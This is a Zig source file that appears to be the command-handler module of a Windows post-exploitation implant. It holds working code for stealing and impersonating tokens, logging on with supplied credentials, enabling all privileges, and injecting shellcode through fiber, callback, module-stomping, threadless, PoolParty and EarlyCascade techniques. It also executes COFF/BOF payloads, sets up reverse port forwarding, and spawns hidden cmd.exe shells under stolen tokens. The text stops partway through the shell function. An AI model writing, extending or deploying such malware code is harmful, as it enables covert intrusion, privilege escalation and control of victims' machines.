const std = @import("std");
const obf = @import("obf.zig");
const build_options = @import("build_options");
const config = @import("config.zig");
const syscalls = @import("syscalls.zig");
const page_allocator = @import("alloc.zig").nx_page_allocator;
const win = @import("win32.zig");
const windows = std.os.windows;
const jsonutil = @import("jsonutil.zig");
const sysinfo = @import("sysinfo.zig");
const coff = @import("coff.zig");
const rpfwd = @import("rpfwd.zig");
const injection = @import("inject.zig");

fn nx_param_string(
    allocator: std.mem.Allocator,
    params: []const u8,
    key: []const u8,
    default: []const u8,
) []const u8 {
    if (params.len == 0) return default;
    const parsed = std.json.parseFromSlice(std.json.Value, allocator, params, .{}) catch return default;
    // The caller's arena owns the parsed document for this cycle.
    return jsonutil.nx_get_string(parsed.value, key) orelse default;
}

fn nx_param_int(allocator: std.mem.Allocator, params: []const u8, key: []const u8, default: i64) i64 {
    if (params.len == 0) return default;
    const parsed = std.json.parseFromSlice(std.json.Value, allocator, params, .{}) catch return default;
    if (parsed.value != .object) return default;
    const item = parsed.value.object.get(key) orelse return default;
    return switch (item) {
        .integer => |n| n,
        .string => |text| std.fmt.parseInt(i64, text, 10) catch default,
        else => default,
    };
}

fn nx_param_bool(allocator: std.mem.Allocator, params: []const u8, key: []const u8, default: bool) bool {
    if (params.len == 0) return default;
    const parsed = std.json.parseFromSlice(std.json.Value, allocator, params, .{}) catch return default;
    if (parsed.value != .object) return default;
    const item = parsed.value.object.get(key) orelse return default;
    return switch (item) {
        .bool => |b| b,
        .integer => |n| n != 0,
        .string => |text| obf.eq(text, "true"),
        else => default,
    };
}

fn nx_wide_z(allocator: std.mem.Allocator, text: []const u8) ![:0]u16 {
    return std.unicode.utf8ToUtf16LeAllocZ(allocator, text);
}

fn nx_wide_path_with_wildcard(allocator: std.mem.Allocator, path: []const u8) ![:0]u16 {
    const base = if (path.len == 0) "." else path;
    var wide: std.ArrayList(u16) = .empty;
    try wide.appendSlice(allocator, try std.unicode.utf8ToUtf16LeAlloc(allocator, base));
    if (std.mem.indexOfAny(u8, base, "*?") == null) {
        if (wide.items.len == 0 or (wide.items[wide.items.len - 1] != '\\' and wide.items[wide.items.len - 1] != '/')) {
            try wide.append(allocator, '\\');
        }
        try wide.append(allocator, '*');
    }
    try wide.append(allocator, 0);
    return wide.items[0 .. wide.items.len - 1 :0];
}

fn nx_append_fmt(
    allocator: std.mem.Allocator,
    out: *std.ArrayList(u8),
    comptime fmt: []const u8,
    args: anytype,
) !void {
    const text = try std.fmt.allocPrint(allocator, fmt, args);
    try out.appendSlice(allocator, text);
}

const NX_TOKEN_SLOTS = 8;

const NxTokenEntry = struct {
    token: ?win.HANDLE = null,
    pid: u32 = 0,
    username: [128]u8 = undefined,
    username_len: usize = 0,
    active: bool = false,
};

var nx_token_store: [NX_TOKEN_SLOTS]NxTokenEntry = @splat(.{});
var nx_impersonation_token: ?win.HANDLE = null;
var nx_process_token: ?win.HANDLE = null;
var nx_token_active: i32 = -1;

fn nx_wide_to_utf8_trim(allocator: std.mem.Allocator, wide: []const u16) ![]u8 {
    var end = wide.len;
    while (end > 0 and wide[end - 1] == 0) : (end -= 1) {}
    return std.unicode.utf16LeToUtf8Alloc(allocator, wide[0..end]);
}

fn nx_token_username(allocator: std.mem.Allocator, token: win.HANDLE) ![]u8 {
    var needed: win.DWORD = 0;
    _ = win.GetTokenInformation(token, .TokenUser, null, 0, &needed);
    if (needed == 0) return allocator.dupe(u8, "");

    const buffer = try allocator.alignedAlloc(u8, std.mem.Alignment.of(win.TOKEN_USER), needed);
    defer allocator.free(buffer);
    if (!win.GetTokenInformation(token, .TokenUser, buffer.ptr, needed, &needed).toBool())
        return allocator.dupe(u8, "");

    const user: *win.TOKEN_USER = @ptrCast(@alignCast(buffer.ptr));
    var name_buf: [256]u16 = undefined;
    var name_len: win.DWORD = name_buf.len;
    var domain_buf: [256]u16 = undefined;
    var domain_len: win.DWORD = domain_buf.len;
    var sid_use: u32 = 0;
    if (!win.LookupAccountSidW(
        null,
        user.User.Sid,
        &name_buf,
        &name_len,
        &domain_buf,
        &domain_len,
        &sid_use,
    ).toBool()) return allocator.dupe(u8, "");

    const name = try nx_wide_to_utf8_trim(allocator, name_buf[0..@min(name_len, name_buf.len)]);
    const domain = try nx_wide_to_utf8_trim(allocator, domain_buf[0..@min(domain_len, domain_buf.len)]);
    if (domain.len > 0) return std.fmt.allocPrint(allocator, "{s}\\{s}", .{ domain, name });
    return name;
}

fn nx_clear_active_tokens() void {
    if (nx_impersonation_token) |token| {
        _ = win.CloseHandle(token);
        nx_impersonation_token = null;
    }
    if (nx_process_token) |token| {
        _ = win.CloseHandle(token);
        nx_process_token = null;
    }
    nx_token_active = -1;
}

fn nx_apply_token(token: win.HANDLE) bool {
    var impersonation: win.HANDLE = undefined;
    if (!win.DuplicateTokenEx(
        token,
        win.MAXIMUM_ALLOWED,
        null,
        .SecurityImpersonation,
        .TokenImpersonation,
        &impersonation,
    ).toBool()) return false;

    var primary: win.HANDLE = undefined;
    const primary_ok = win.DuplicateTokenEx(
        token,
        win.MAXIMUM_ALLOWED,
        null,
        .SecurityImpersonation,
        .TokenPrimary,
        &primary,
    ).toBool();

    if (!win.ImpersonateLoggedOnUser(impersonation).toBool()) {
        _ = win.CloseHandle(impersonation);
        if (primary_ok) _ = win.CloseHandle(primary);
        return false;
    }

    if (nx_impersonation_token) |old| _ = win.CloseHandle(old);
    if (nx_process_token) |old| _ = win.CloseHandle(old);
    nx_impersonation_token = impersonation;
    nx_process_token = if (primary_ok) primary else null;
    return true;
}

fn nx_store_token(token: win.HANDLE, pid: u32, username: []const u8) i32 {
    for (&nx_token_store, 0..) |*entry, index| {
        if (entry.active) continue;
        var stored: win.HANDLE = undefined;
        if (!win.DuplicateTokenEx(
            token,
            win.MAXIMUM_ALLOWED,
            null,
            .SecurityImpersonation,
            .TokenImpersonation,
            &stored,
        ).toBool()) return -1;

        entry.token = stored;
        entry.pid = pid;
        entry.active = true;
        const len = @min(username.len, entry.username.len);
        @memcpy(entry.username[0..len], username[0..len]);
        entry.username_len = len;
        return @intCast(index);
    }
    return -1;
}

fn nx_enable_privilege(allocator: std.mem.Allocator, name: []const u8) void {
    var token: win.HANDLE = undefined;
    if (!win.OpenProcessToken(
        win.GetCurrentProcess(),
        win.TOKEN_QUERY | win.TOKEN_ADJUST_PRIVILEGES,
        &token,
    ).toBool()) return;
    defer _ = win.CloseHandle(token);

    const wide_name = std.unicode.utf8ToUtf16LeAllocZ(allocator, name) catch return;
    var luid: win.LUID = undefined;
    if (!win.LookupPrivilegeValueW(null, wide_name.ptr, &luid).toBool()) return;

    var state: win.TOKEN_PRIVILEGES = std.mem.zeroes(win.TOKEN_PRIVILEGES);
    state.PrivilegeCount = 1;
    state.Privileges[0].Luid = luid;
    state.Privileges[0].Attributes = win.SE_PRIVILEGE_ENABLED;
    _ = win.AdjustTokenPrivileges(token, win.BOOL.FALSE, &state, @sizeOf(win.TOKEN_PRIVILEGES), null, null);
}

pub fn nx_get_privs(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    _ = params;
    var token: win.HANDLE = undefined;
    if (!win.OpenProcessToken(
        win.GetCurrentProcess(),
        win.TOKEN_QUERY | win.TOKEN_ADJUST_PRIVILEGES,
        &token,
    ).toBool()) return allocator.dupe(u8, "Failed to open process token");
    defer _ = win.CloseHandle(token);

    var needed: win.DWORD = 0;
    _ = win.GetTokenInformation(token, .TokenPrivileges, null, 0, &needed);
    if (needed == 0) return allocator.dupe(u8, "No privilege info");

    const buffer = try allocator.alignedAlloc(u8, std.mem.Alignment.of(win.TOKEN_PRIVILEGES), needed);
    defer allocator.free(buffer);
    if (!win.GetTokenInformation(token, .TokenPrivileges, buffer.ptr, needed, &needed).toBool())
        return allocator.dupe(u8, "Failed to get token info");

    const privileges_struct: *win.TOKEN_PRIVILEGES = @ptrCast(@alignCast(buffer.ptr));
    const privileges: [*]win.LUID_AND_ATTRIBUTES = @ptrCast(&privileges_struct.Privileges);
    var out: std.ArrayList(u8) = .empty;
    errdefer out.deinit(allocator);

    var i: usize = 0;
    while (i < @as(usize, privileges_struct.PrivilegeCount)) : (i += 1) {
        var name_buf: [256]u16 = undefined;
        var name_len: win.DWORD = name_buf.len;
        if (!win.LookupPrivilegeNameW(null, &privileges[i].Luid, &name_buf, &name_len).toBool())
            continue;

        const name = try nx_wide_to_utf8_trim(allocator, name_buf[0..@min(name_len, name_buf.len)]);
        const enabled = (privileges[i].Attributes & win.SE_PRIVILEGE_ENABLED) != 0;
        try nx_append_fmt(allocator, &out, "{s} [{s}]\n", .{ name, if (enabled) "ENABLED" else "DISABLED" });

        var single: win.TOKEN_PRIVILEGES = std.mem.zeroes(win.TOKEN_PRIVILEGES);
        single.PrivilegeCount = 1;
        single.Privileges[0].Luid = privileges[i].Luid;
        single.Privileges[0].Attributes = win.SE_PRIVILEGE_ENABLED;
        _ = win.AdjustTokenPrivileges(token, win.BOOL.FALSE, &single, @sizeOf(win.TOKEN_PRIVILEGES), null, null);
    }

    if (out.items.len == 0) return allocator.dupe(u8, "No privileges found");
    try out.appendSlice(allocator, "\nEnabled all held privileges.\n");
    return out.toOwnedSlice(allocator);
}

pub fn nx_steal_token(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    const pid_value = nx_param_int(allocator, params, "pid", 0);
    if (pid_value <= 0 or pid_value > std.math.maxInt(u32))
        return allocator.dupe(u8, "PID required");
    const pid: u32 = @intCast(pid_value);

    const process = win.OpenProcess(win.PROCESS_QUERY_INFORMATION, win.BOOL.FALSE, pid) orelse
        return allocator.dupe(u8, "Failed to open process");
    defer _ = win.CloseHandle(process);

    var token: win.HANDLE = undefined;
    if (!win.OpenProcessToken(process, win.TOKEN_DUPLICATE | win.TOKEN_QUERY, &token).toBool())
        return allocator.dupe(u8, "Failed to open process token");
    defer _ = win.CloseHandle(token);

    if (!nx_apply_token(token)) return allocator.dupe(u8, "Impersonation failed");
    const username = nx_token_username(allocator, token) catch "";
    _ = nx_store_token(token, pid, username);
    nx_token_active = -1;
    return std.fmt.allocPrint(allocator, "Token stolen from PID {d}", .{pid});
}

pub fn nx_rev2self(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    _ = params;
    if (win.RevertToSelf().toBool()) {
        nx_clear_active_tokens();
        return allocator.dupe(u8, "Reverted to self");
    }
    return allocator.dupe(u8, "RevertToSelf failed");
}

pub fn nx_make_token(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    const domain_arg = nx_param_string(allocator, params, "domain", ".");
    const domain = if (domain_arg.len > 0) domain_arg else ".";
    const username = nx_param_string(allocator, params, "username", "");
    const password = nx_param_string(allocator, params, "password", "");
    if (username.len == 0 or password.len == 0)
        return allocator.dupe(u8, "Username and password are required");

    const wide_user = try nx_wide_z(allocator, username);
    const wide_domain = try nx_wide_z(allocator, domain);
    const wide_password = try nx_wide_z(allocator, password);
    defer @memset(wide_password, 0);

    var token: win.HANDLE = undefined;
    const ok = win.LogonUserW(
        wide_user.ptr,
        wide_domain.ptr,
        wide_password.ptr,
        win.LOGON32_LOGON_NEW_CREDENTIALS,
        0,
        &token,
    ).toBool();
    if (!ok) return allocator.dupe(u8, "LogonUserW failed");
    defer _ = win.CloseHandle(token);

    if (!nx_apply_token(token)) return allocator.dupe(u8, "Failed to impersonate the new logon");
    const display = try std.fmt.allocPrint(allocator, "{s}\\{s}", .{ domain, username });
    nx_token_active = nx_store_token(token, 0, display);
    return std.fmt.allocPrint(allocator, "Now impersonating {s}", .{display});
}

pub fn nx_token_store_cmd(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    const action = nx_param_string(allocator, params, "action", "");
    const id_value = nx_param_int(allocator, params, "id", -1);

    if (obf.eq(action, "list")) {
        var out: std.ArrayList(u8) = .empty;
        errdefer out.deinit(allocator);
        try out.appendSlice(allocator, "ID\tUser\tPID\n");
        var any = false;
        for (nx_token_store, 0..) |entry, index| {
            if (!entry.active) continue;
            any = true;
            const user = if (entry.username_len > 0) entry.username[0..entry.username_len] else "-";
            try nx_append_fmt(allocator, &out, "{d}\t{s}\t{d}\n", .{ index, user, entry.pid });
        }
        if (!any) try out.appendSlice(allocator, "(no tokens stored)\n");
        return out.toOwnedSlice(allocator);
    }

    if (id_value < 0 or id_value >= NX_TOKEN_SLOTS)
        return allocator.dupe(u8, "Invalid or inactive token ID");
    const index: usize = @intCast(id_value);

    if (obf.eq(action, "use")) {
        if (!nx_token_store[index].active) return allocator.dupe(u8, "Invalid or inactive token ID");
        const token = nx_token_store[index].token orelse return allocator.dupe(u8, "Invalid or inactive token ID");
        if (!nx_apply_token(token)) return allocator.dupe(u8, "Failed to impersonate stored token");
        nx_token_active = @intCast(id_value);
        const user = if (nx_token_store[index].username_len > 0)
            nx_token_store[index].username[0..nx_token_store[index].username_len]
        else
            "unknown";
        return std.fmt.allocPrint(allocator, "Using token #{d} ({s})", .{ index, user });
    }

    if (obf.eq(action, "remove")) {
        if (!nx_token_store[index].active) return allocator.dupe(u8, "Invalid or inactive token ID");
        if (nx_token_active == id_value) {
            _ = win.RevertToSelf();
            nx_clear_active_tokens();
        }
        if (nx_token_store[index].token) |token| _ = win.CloseHandle(token);
        nx_token_store[index].token = null;
        nx_token_store[index].pid = 0;
        nx_token_store[index].username_len = 0;
        nx_token_store[index].active = false;
        return std.fmt.allocPrint(allocator, "Removed token #{d}", .{index});
    }

    return allocator.dupe(u8, "Unknown token_store action (list/use/remove)");
}

pub fn nx_block_dlls(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    const enable = nx_param_bool(allocator, params, "enable", false);
    var policy: win.PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY = .{
        .Flags = if (enable) 1 else 0,
    };
    if (!win.SetProcessMitigationPolicy(
        .ProcessSignaturePolicy,
        @ptrCast(&policy),
        @sizeOf(win.PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY),
    ).toBool()) return allocator.dupe(u8, "SetProcessMitigationPolicy failed");
    return allocator.dupe(u8, if (enable) "Blocking non-Microsoft DLLs" else "Allowing non-Microsoft DLLs");
}

const NxCachedFile = struct {
    id: []u8,
    name: []u8,
    data: []u8,
};

var nx_file_cache: std.ArrayList(NxCachedFile) = .empty;

fn nx_find_cached_file(id: []const u8, name: []const u8) ?*NxCachedFile {
    for (nx_file_cache.items) |*entry| {
        if (id.len > 0 and std.mem.eql(u8, entry.id, id)) return entry;
        if (name.len > 0 and std.mem.eql(u8, entry.name, name)) return entry;
    }
    return null;
}

pub fn nx_cached_file_data(file_id: []const u8, file_name: []const u8) ?[]const u8 {
    const entry = nx_find_cached_file(file_id, file_name) orelse return null;
    return entry.data;
}

pub fn nx_cache_downloaded_file(
    allocator: std.mem.Allocator,
    file_id: []const u8,
    file_name: []const u8,
    data: []const u8,
) !void {
    const id_copy = try page_allocator.dupe(u8, file_id);
    const name_copy = try page_allocator.dupe(u8, file_name);
    const data_copy = try page_allocator.dupe(u8, data);
    for (nx_file_cache.items, 0..) |entry, index| {
        if ((file_id.len > 0 and std.mem.eql(u8, entry.id, file_id)) or
            (file_name.len > 0 and std.mem.eql(u8, entry.name, file_name)))
        {
            const existing = &nx_file_cache.items[index];
            page_allocator.free(existing.data);
            page_allocator.free(existing.id);
            page_allocator.free(existing.name);
            existing.* = .{ .id = id_copy, .name = name_copy, .data = data_copy };
            return;
        }
    }
    if (nx_file_cache.items.len >= 32) return error.FileCacheFull;
    try nx_file_cache.append(page_allocator, .{ .id = id_copy, .name = name_copy, .data = data_copy });
    _ = allocator;
}

fn nx_decode_hex(allocator: std.mem.Allocator, text: []const u8) ![]u8 {
    if (text.len % 2 != 0) return error.InvalidHex;
    const output = try allocator.alloc(u8, text.len / 2);
    _ = std.fmt.hexToBytes(output, text) catch return error.InvalidHex;
    return output;
}

fn nx_base64_encode(allocator: std.mem.Allocator, data: []const u8) ![]u8 {
    const encoder = std.base64.standard.Encoder;
    const output = try allocator.alloc(u8, encoder.calcSize(data.len));
    _ = encoder.encode(output, data);
    return output;
}

pub fn nx_register_file(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    const file_id = nx_param_string(allocator, params, "file_id", "");
    const file_name = nx_param_string(allocator, params, "file_name", "");
    const file_data_hex = nx_param_string(allocator, params, "file_data", "");
    if (file_data_hex.len == 0)
        return allocator.dupe(u8, "file_data is required for registration");

    const decoded = nx_decode_hex(allocator, file_data_hex) catch
        return allocator.dupe(u8, "Failed to decode file_data");
    if (decoded.len == 0)
        return allocator.dupe(u8, "Registered file is empty");

    var existing: ?usize = null;
    for (nx_file_cache.items, 0..) |entry, index| {
        if ((file_id.len > 0 and std.mem.eql(u8, entry.id, file_id)) or
            (file_name.len > 0 and std.mem.eql(u8, entry.name, file_name)))
        {
            existing = index;
            break;
        }
    }

    const id_copy = try page_allocator.dupe(u8, file_id);
    const name_copy = try page_allocator.dupe(u8, file_name);
    const data_copy = try page_allocator.dupe(u8, decoded);

    if (existing) |index| {
        const entry = &nx_file_cache.items[index];
        page_allocator.free(entry.data);
        page_allocator.free(entry.id);
        page_allocator.free(entry.name);
        entry.* = .{ .id = id_copy, .name = name_copy, .data = data_copy };
    } else {
        if (nx_file_cache.items.len >= 32)
            return allocator.dupe(u8, "File cache is full");
        try nx_file_cache.append(page_allocator, .{
            .id = id_copy,
            .name = name_copy,
            .data = data_copy,
        });
    }

    const display_name = if (file_name.len > 0) file_name else file_id;
    return std.fmt.allocPrint(allocator, "Registered {s} ({d} bytes)", .{ display_name, data_copy.len });
}

fn nx_decode_base64(allocator: std.mem.Allocator, text: []const u8) ![]u8 {
    const size = try std.base64.standard.Decoder.calcSizeForSlice(text);
    const decoded = try allocator.alloc(u8, size);
    try std.base64.standard.Decoder.decode(decoded, text);
    return decoded;
}

fn nx_shellcode_bytes(allocator: std.mem.Allocator, params: []const u8) !?[]u8 {
    const encoded = nx_param_string(allocator, params, "shellcode", "");
    if (encoded.len == 0) return null;
    return nx_decode_base64(allocator, encoded) catch null;
}

fn nx_executable_buffer(allocator: std.mem.Allocator, shellcode: []const u8) !?*anyopaque {
    if (shellcode.len == 0) return null;
    const memory = injection.nx_alloc_local(shellcode.len, win.PAGE_READWRITE) orelse return null;
    @memcpy(@as([*]u8, @ptrCast(memory))[0..shellcode.len], shellcode);
    var old_protect: win.DWORD = 0;
    if (!syscalls.nx_protect(
        win.GetCurrentProcess(),
        memory,
        shellcode.len,
        win.PAGE_EXECUTE_READ,
        &old_protect,
    )) {
        injection.nx_free_local(memory);
        return null;
    }
    _ = allocator;
    return memory;
}

var nx_thread_fiber: ?*anyopaque = null;
var nx_fiber_home: ?*anyopaque = null;

fn nx_fiber_entry(param: ?*anyopaque) callconv(.winapi) void {
    const address = param orelse return;
    const entry: *const fn () callconv(.winapi) void = @ptrCast(@alignCast(address));
    entry();
    if (nx_fiber_home) |home| win.SwitchToFiber(home);
}

pub fn nx_inject_fiber(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    const shellcode = (try nx_shellcode_bytes(allocator, params)) orelse
        return allocator.dupe(u8, "No shellcode provided");
    const memory = (try nx_executable_buffer(allocator, shellcode)) orelse
        return allocator.dupe(u8, "Failed to allocate executable memory");

    if (nx_thread_fiber == null) {
        nx_thread_fiber = win.ConvertThreadToFiber(null) orelse
            return allocator.dupe(u8, "ConvertThreadToFiber failed");
    }
    nx_fiber_home = nx_thread_fiber;

    const fiber = win.CreateFiberEx(0, 0, 0, nx_fiber_entry, memory) orelse
        return allocator.dupe(u8, "CreateFiberEx failed");
    win.SwitchToFiber(fiber);
    return allocator.dupe(u8, "Fiber execution completed");
}

fn nx_inject_callback_technique(
    allocator: std.mem.Allocator,
    params: []const u8,
    technique: []const u8,
) ![]u8 {
    const shellcode = (try nx_shellcode_bytes(allocator, params)) orelse
        return allocator.dupe(u8, "No shellcode provided");
    const memory = (try nx_executable_buffer(allocator, shellcode)) orelse
        return allocator.dupe(u8, "Failed to allocate executable memory");

    if (obf.eq(technique, "calendar")) {
        // The callback return value decides whether enumeration continues;
        // shellcode usually returns zero, so a FALSE result does not mean the
        // shellcode failed to run.
        _ = win.EnumCalendarInfoA(memory, 0x0400, 0xFFFFFFFF, 0x00000001);
        return allocator.dupe(u8, "EnumCalendarInfoA execution completed");
    }
    if (obf.eq(technique, "desktops")) {
        const station = win.GetProcessWindowStation() orelse
            return allocator.dupe(u8, "GetProcessWindowStation failed");
        _ = win.EnumDesktopsW(station, memory, 0);
        return allocator.dupe(u8, "EnumDesktopsW execution completed");
    }
    if (obf.eq(technique, "winstations")) {
        _ = win.EnumWindowStationsW(memory, 0);
        return allocator.dupe(u8, "EnumWindowStationsW execution completed");
    }
    if (obf.eq(technique, "geoid")) {
        _ = win.EnumSystemGeoID(16, 0, memory);
        return allocator.dupe(u8, "EnumSystemGeoID execution completed");
    }
    return std.fmt.allocPrint(allocator, "Unknown callback technique: {s}", .{technique});
}

pub fn nx_inject_callback(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    if (!comptime build_options.inj_callback)
        return allocator.dupe(u8, "callback injection is not included in this build");
    const technique = nx_param_string(allocator, params, "technique", "calendar");
    return nx_inject_callback_technique(allocator, params, technique);
}

pub fn nx_inject_technique(
    allocator: std.mem.Allocator,
    params: []const u8,
    technique: []const u8,
) ![]u8 {
    if (obf.eq(technique, "fiber")) {
        if (!comptime build_options.inj_fiber)
            return allocator.dupe(u8, "inject_fiber is not included in this build");
        return nx_inject_fiber(allocator, params);
    }
    if (obf.eq(technique, "callback")) {
        if (!comptime build_options.inj_callback)
            return allocator.dupe(u8, "callback injection is not included in this build");
        return nx_inject_callback_technique(allocator, params, "calendar");
    }
    if (obf.eq(technique, "calendar") or
        obf.eq(technique, "desktops") or
        obf.eq(technique, "winstations") or
        obf.eq(technique, "geoid"))
    {
        if (!comptime build_options.inj_callback)
            return allocator.dupe(u8, "callback injection is not included in this build");
        return nx_inject_callback_technique(allocator, params, technique);
    }
    if (obf.eq(technique, "module_stomp")) {
        if (!comptime build_options.inj_overload)
            return allocator.dupe(u8, "inject_module_stomp is not included in this build");
        const shellcode = (try nx_shellcode_bytes(allocator, params)) orelse
            return allocator.dupe(u8, "No shellcode provided");
        const dll = nx_param_string(allocator, params, "dll", "");
        return injection.nx_module_stomp(allocator, shellcode, dll);
    }
    if (obf.eq(technique, "module_overload")) {
        if (!comptime build_options.inj_overload)
            return allocator.dupe(u8, "inject_module_overload is not included in this build");
        const shellcode = (try nx_shellcode_bytes(allocator, params)) orelse
            return allocator.dupe(u8, "No shellcode provided");
        const dll = nx_param_string(allocator, params, "dll", "");
        const pid = nx_param_int(allocator, params, "pid", 0);
        return injection.nx_module_overload(allocator, shellcode, if (pid > 0) @intCast(pid) else 0, dll);
    }
    if (obf.eq(technique, "threadless")) {
        if (!comptime build_options.inj_threadless)
            return allocator.dupe(u8, "inject_threadless is not included in this build");
        const shellcode = (try nx_shellcode_bytes(allocator, params)) orelse
            return allocator.dupe(u8, "No shellcode provided");
        const pid = nx_param_int(allocator, params, "pid", 0);
        return injection.nx_threadless(allocator, shellcode, if (pid > 0) @intCast(pid) else 0);
    }
    if (obf.eq(technique, "kct")) {
        if (!comptime build_options.inj_kct)
            return allocator.dupe(u8, "inject_kct is not included in this build");
        const shellcode = (try nx_shellcode_bytes(allocator, params)) orelse
            return allocator.dupe(u8, "No shellcode provided");
        const pid = nx_param_int(allocator, params, "pid", 0);
        return injection.nx_kct(allocator, shellcode, if (pid > 0) @intCast(pid) else 0);
    }
    if (obf.eq(technique, "poolparty")) {
        if (!comptime build_options.inj_poolparty)
            return allocator.dupe(u8, "inject_poolparty is not included in this build");
        const shellcode = (try nx_shellcode_bytes(allocator, params)) orelse
            return allocator.dupe(u8, "No shellcode provided");
        const pid = nx_param_int(allocator, params, "pid", 0);
        return injection.nx_pool_party(allocator, shellcode, if (pid > 0) @intCast(pid) else 0);
    }
    if (obf.eq(technique, "earlycascade")) {
        if (!comptime build_options.inj_earlycascade)
            return allocator.dupe(u8, "inject_earlycascade is not included in this build");
        const shellcode = (try nx_shellcode_bytes(allocator, params)) orelse
            return allocator.dupe(u8, "No shellcode provided");
        return injection.nx_early_cascade(allocator, shellcode);
    }
    return std.fmt.allocPrint(allocator, "Unknown injection technique: {s}", .{technique});
}

pub fn nx_inject(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    var technique = nx_param_string(allocator, params, "technique", "");
    if (technique.len == 0) {
        const cfg = try config.nx_load(allocator);
        technique = cfg.default_injection_technique;
    }
    if (technique.len == 0 or obf.eq(technique, "none"))
        return allocator.dupe(u8, "No injection technique selected (build default is 'none')");
    return nx_inject_technique(allocator, params, technique);
}

pub fn nx_execute_coff(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    var k_bof_data = obf.z("bof_data");
    var k_bof_id = obf.z("bof_id");
    var k_coff_name = obf.z("coff_name");
    var k_coff_args = obf.z("coff_arguments");
    const bof_data_hex = nx_param_string(allocator, params, k_bof_data.slice(), "");
    const bof_id = nx_param_string(allocator, params, k_bof_id.slice(), "");
    const coff_name = nx_param_string(allocator, params, k_coff_name.slice(), "");
    const function_name = nx_param_string(allocator, params, "function_name", "go");
    const args_hex = nx_param_string(allocator, params, k_coff_args.slice(), "");
    const binary_output = nx_param_bool(allocator, params, "binary_output", false);
    const timeout_ms = coff.nx_default_timeout_ms(nx_param_int(allocator, params, "timeout", 30));

    var coff_bytes: []const u8 = undefined;
    if (bof_data_hex.len > 0) {
        coff_bytes = nx_decode_hex(allocator, bof_data_hex) catch
            return allocator.dupe(u8, "Input decode failed");
    } else {
        const cached = nx_find_cached_file(bof_id, coff_name) orelse {
            return std.fmt.allocPrint(
                allocator,
                "Object not cached (id='{s}' name='{s}')",
                .{ bof_id, coff_name },
            );
        };
        coff_bytes = cached.data;
    }

    const args = if (args_hex.len > 0)
        nx_decode_hex(allocator, args_hex) catch return allocator.dupe(u8, "Args decode failed")
    else
        &[_]u8{ 0, 0, 0, 0 };

    const result = try coff.nx_execute(allocator, coff_bytes, function_name, args, timeout_ms);
    switch (result.status) {
        .busy, .timed_out => return result.output,
        .failed => {
            if (result.output.len > 0) {
                return std.fmt.allocPrint(
                    allocator,
                    "Loader failed (size={d}, name={s}) with output:\n{s}",
                    .{ coff_bytes.len, function_name, result.output },
                );
            }
            return std.fmt.allocPrint(
                allocator,
                "Loader failed (size={d}, name={s})",
                .{ coff_bytes.len, function_name },
            );
        },
        .ok => {
            if (result.output.len == 0)
                return allocator.dupe(u8, "Completed (no output)");
            if (binary_output) return nx_base64_encode(allocator, result.output);
            return result.output;
        },
    }
}

pub fn nx_rportfwd(allocator: std.mem.Allocator, params: []const u8) ![]u8 {
    const action = nx_param_string(allocator, params, "action", "start");
    const port_value = nx_param_int(allocator, params, "port", 0);
    const port: u16 = if (port_value > 0 and port_value <= 65535) @intCast(port_value) else 0;

    if (obf.eq(action, "stop")) {
        if (port > 0) rpfwd.nx_stop(port) else rpfwd.nx_stop_all();
        return allocator.dupe(u8, "Stopped reverse port forward");
    }

    if (port == 0) return allocator.dupe(u8, "Invalid port");
    if (rpfwd.nx_start(port))
        return std.fmt.allocPrint(allocator, "Listening on port {d}", .{port});
    return std.fmt.allocPrint(allocator, "Failed to listen on port {d}", .{port});
}

pub fn nx_shell(allocator: std.mem.Allocator, command: []const u8) ![]u8 {
    const command_line = try std.fmt.allocPrint(allocator, "cmd.exe /c {s}", .{command});
    const wide_command = try std.unicode.utf8ToUtf16LeAllocZ(allocator, command_line);

    var read_pipe: win.HANDLE = undefined;
    var write_pipe: win.HANDLE = undefined;
    var pipe_attributes = win.NX_SECURITY_ATTRIBUTES_INHERIT;
    if (!win.CreatePipe(&read_pipe, &write_pipe, &pipe_attributes, 0).toBool())
        return allocator.dupe(u8, "CreatePipe failed");
    _ = win.SetHandleInformation(read_pipe, win.HANDLE_FLAG_INHERIT, 0);

    const nul_name = std.unicode.utf8ToUtf16LeStringLiteral("NUL");
    const nul_handle = win.CreateFileW(
        nul_name.ptr,
        win.GENERIC_READ,
        win.FILE_SHARE_READ,
        &pipe_attributes,
        win.OPEN_EXISTING,
        0,
        null,
    );

    var startup: win.STARTUPINFOW = std.mem.zeroes(win.STARTUPINFOW);
    startup.cb = @sizeOf(win.STARTUPINFOW);
    startup.dwFlags = win.STARTF_USESTDHANDLES | win.STARTF_USESHOWWINDOW;
    startup.wShowWindow = win.SW_HIDE;
    startup.hStdOutput = write_pipe;
    startup.hStdError = write_pipe;
    startup.hStdInput = if (nul_handle == win.INVALID_HANDLE_VALUE) null else nul_handle;

    var process_info: win.PROCESS_INFORMATION = std.mem.zeroes(win.PROCESS_INFORMATION);
    var created = false;
    var used_primary_token = false;
    if (nx_process_token) |token| {
        nx_enable_privilege(allocator, "SeAssignPrimaryTokenPrivilege");
        nx_enable_privilege(allocator, "SeIncreaseQuotaPrivilege");
        created = win.CreateProcessAsUserW(
            token,
            null,
            wide_command.ptr,
            null,
            null,
            windows.BOOL.TRUE,
            win.CREATE_NO_WINDOW,
            null,
            null,
            &startup,
            &process_info,
        ).toBool();
        used_primary_token = true;
    } else if (nx_impersonation_token != null) {
        _ = win.CloseHandle(write_pipe);
        if (nul_handle != win.INVALID_HANDLE_VALUE) _ = win.CloseHandle(nul_handle);
        _ = win.CloseHandle(read_pipe);
        return allocator.dupe(u8, "No primary token for impersonated shell");
    } else {
        created = win.CreateProcessW(
            null,
            wide_command.ptr,
            null,
            null,
            windows.BOOL.TRUE,
            win.CREATE_NO_WINDOW,
            null,
            null,
            &startup,
            &process_info,
        ).toBool();
    }

    _ = win.CloseHandle(write_pipe);
    if (nul_handle != win.INVALID_HANDLE_VALUE) _ = win.CloseHandle(nul_handle);
    if (!created) {
        _ = win.CloseHandle(read_pipe);
        return allocator.dupe(
